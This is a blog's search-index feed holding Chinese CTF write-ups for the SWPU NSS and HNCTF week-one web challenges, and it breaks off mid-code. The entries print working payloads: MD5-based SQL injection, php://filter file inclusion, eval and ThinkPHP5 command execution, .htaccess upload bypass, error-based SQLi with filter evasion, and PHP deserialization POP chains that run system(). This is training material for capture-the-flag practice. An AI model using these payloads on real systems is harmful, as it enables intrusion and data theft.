<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SWPU NSS</title>
      <link href="/2022/10/14/SWPU/"/>
      <url>/2022/10/14/SWPU/</url>
      
        <content type="html"><![CDATA[<h3 id="奇妙的MD5"><a href="#奇妙的MD5" class="headerlink" title="奇妙的MD5"></a><strong>奇妙的MD5</strong></h3><p>提示：ctf 中一个奇妙的字符串+md5</p><blockquote><p><strong>ffifdyop</strong></p><p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为字符串：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66�]��!r,��b</code> </p><p>用途：</p><p>select * from admin where password&#x3D;’’or’6&lt;乱码&gt;’ </p><p>就相当于select * from admin where password&#x3D;’’or 1 实现sql注入</p></blockquote><p>页面跳转后，查看源码：</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193529982.png"></p><p>get传参：</p><blockquote><p>?x&#x3D;s155964671a&amp;y&#x3D;s214587387a</p></blockquote><p>post传参：</p><blockquote><p>wqh[]&#x3D;1&amp;dsy[]&#x3D;2</p></blockquote><h3 id="where-am-i"><a href="#where-am-i" class="headerlink" title="where_am_i"></a><strong>where_am_i</strong></h3><p>社工题</p><p>图片上是山水间古迹酒店，百度一下</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193637085.png"></p><p>把 <code>-</code> 去掉, 输入 <code>02886112888</code> 即可得到 flag</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193647041.png"></p><h3 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h3><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"php"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Nice!!!"</span><span class="token punctuation">;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//flag.php </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php伪协议：</p><blockquote><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><p>base64解码后，提示：</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193703334.png"></p><p>payload修改为：</p><blockquote><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag</p></blockquote><h3 id="webdog1-start"><a href="#webdog1-start" class="headerlink" title="webdog1__start"></a>webdog1__start</h3><p>右键注释</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'web'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$first</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'web'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token operator">--</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到一个加密前后都是 0e 的字符串就行</p><blockquote><p>md5(0e215962017) &#x3D; 0e291242476940776845150308577824</p></blockquote><p>之后跳转到 start.php, response header 中有 <code>hint: why not go to f14g.php first</code></p><p>最后再根据 hint 跳转到 F1l1l1l1l1lag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><blockquote><p>?get&#x3D;system($_GET[1]);&amp;1&#x3D;cat &#x2F;flag</p></blockquote><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193735315.png"></p><h3 id="Ez-upload"><a href="#Ez-upload" class="headerlink" title="Ez_upload"></a>Ez_upload</h3><p>上传.htaccess，把jpg文件当作php执行</p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014164620760.png" style="zoom:50%;" /><p>上传1.jpg</p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014164708125.png" style="zoom: 50%;" /><p>flag 在环境变量里</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193801549.png"></p><h3 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h3><p>访问&#x2F;js&#x2F;1.js</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014165254699.png"></p><p>解码后是 NsScTf.php，访问</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//hint: 与get相似的另一种请求协议是什么呢</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">nss</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./hint2.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/n|c/m"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问 hint2.php 显示 <code>有没有一种可能，类是nss2</code></p><p>后面不理解要干什么</p><h3 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h3><p>查看 robots.txt 发现 &#x2F;NSS&#x2F;index.php</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014170101813.png"></p><p>thinkphp5</p><p>参考文章 <a href="https://y4er.com/posts/thinkphp5-rce/">https://y4er.com/posts/thinkphp5-rce/</a></p><p>找一个 payload</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;1.14.71.254:28133&#x2F;NSS&#x2F;index.php?s&#x3D;index|think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][0]&#x3D;cat &#x2F;nss&#x2F;ctf&#x2F;flag&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>随便测试了一下，发现是报错注入</p><p>过滤了空格和 and, 分别用注释&#x2F;**&#x2F;和双写aandnd绕过</p><p>爆数据库名</p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193834336.png" style="zoom:50%;" /><p>爆表名</p><blockquote><p>nss&#x3D;1’&#x2F;<strong>&#x2F;aandnd&#x2F;</strong>&#x2F;updatexml(1,concat(0x5e,(select&#x2F;<strong>&#x2F;group_concat(table_name)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;information_schema.tables&#x2F;</strong>&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;0x4e53535f6462),0x5e),1)#</p></blockquote><p>回显</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193851132.png"></p><p>or被过滤了，所以修改一下，双写or：</p><blockquote><p>nss&#x3D;1’&#x2F;<strong>&#x2F;aandnd&#x2F;</strong>&#x2F;updatexml(1,concat(0x5e,(select&#x2F;<strong>&#x2F;group_concat(table_name)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;infoorrmation_schema.tables&#x2F;</strong>&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;0x4e53535f6462),0x5e),1)#</p></blockquote><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193924924.png"></p><p>查NSS_tb字段：</p><blockquote><p>nss&#x3D;1’&#x2F;<strong>&#x2F;aandnd&#x2F;</strong>&#x2F;updatexml(1,concat(0x5e,(select&#x2F;<strong>&#x2F;group_concat(column_name)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;infoorrmation_schema.columns&#x2F;</strong>&#x2F;where&#x2F;**&#x2F;table_name&#x3D;0x4e53535f7462),0x5e),1)#</p></blockquote><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193932987.png"></p><p>查Secr3t字段值：</p><blockquote><p>nss&#x3D;1’&#x2F;<strong>&#x2F;aandnd&#x2F;</strong>&#x2F;updatexml(1,concat(0x5e,(select&#x2F;<strong>&#x2F;Secr3t&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;NSS_tb),0x5e),1)#</p></blockquote><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193937685.png"></p><p>得到flag，但不完整，使用mid 就可以得到flag后面的一部分</p><blockquote><p>nss&#x3D;1’&#x2F;<strong>&#x2F;aandnd&#x2F;</strong>&#x2F;updatexml(1,concat(0x5e,mid((select&#x2F;<strong>&#x2F;Secr3t&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;NSS_tb),32),0x5e),1)#</p></blockquote><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014193943259.png"></p><h3 id="ez-1zpop"><a href="#ez-1zpop" class="headerlink" title="ez_1zpop"></a>ez_1zpop</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dxg</span><span class="token punctuation">&#123;</span>   <span class="token keyword">function</span> <span class="token function-definition function">fmm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">lt</span><span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$impo</span><span class="token operator">=</span><span class="token string single-quoted-string">'hi'</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$md51</span><span class="token operator">=</span><span class="token string single-quoted-string">'weclome'</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$md52</span><span class="token operator">=</span><span class="token string single-quoted-string">'to NSS'</span><span class="token punctuation">;</span>   <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dxg</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dxg</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span><span class="token operator">-></span><span class="token function">fmm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">md51</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">md52</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">md51</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">md52</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span><span class="token operator">-></span><span class="token function">fmm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">fin</span><span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'https://www.ctfer.vip'</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$title</span><span class="token punctuation">;</span>   <span class="token keyword">function</span> <span class="token function-definition function">fmm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>      <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>      <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">title</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NSS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$Data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NSS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>   <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> pop 链构造以及 wakeup 的绕过</p><p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">lt</span><span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$impo</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$md51</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$md52</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">fin</span><span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system($_GET[1])'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">lt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">impo</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">md51</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">md52</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'s155964671a'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014195018263.png"></p><h3 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h3><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">lyh</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'NSSCTF.com'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lly</span><span class="token punctuation">;</span>          <span class="token keyword">function</span>  <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lt</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lly</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">lyh</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$lt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lly</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system($_GET[1]);'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">lyh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014195250533.png"></p><h3 id="xff"><a href="#xff" class="headerlink" title="xff"></a>xff</h3><p>抓包修改head中的xff为127.0.0.1</p><h3 id="js-sign"><a href="#js-sign" class="headerlink" title="js_sign"></a>js_sign</h3><p>右键查看 main.js</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014195729946.png"></p><p>base64 解密后是 tapcode</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014195905168.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF</title>
      <link href="/2022/10/03/HNCTF/"/>
      <url>/2022/10/03/HNCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Interesting-http"><a href="#Interesting-http" class="headerlink" title="Interesting_http"></a>Interesting_http</h3><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221109235647842.png"></p><h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>&#x2F;2048.js</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221110000626769.png"></p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221110000653657.png"></p><h3 id="easy-html"><a href="#easy-html" class="headerlink" title="easy_html"></a>easy_html</h3><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221110000705270.png"></p><h3 id="Interesting-include"><a href="#Interesting-include" class="headerlink" title="Interesting_include"></a>Interesting_include</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//WEB手要懂得搜索</span><span class="token comment">//flag in ./flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filter'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filter'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token 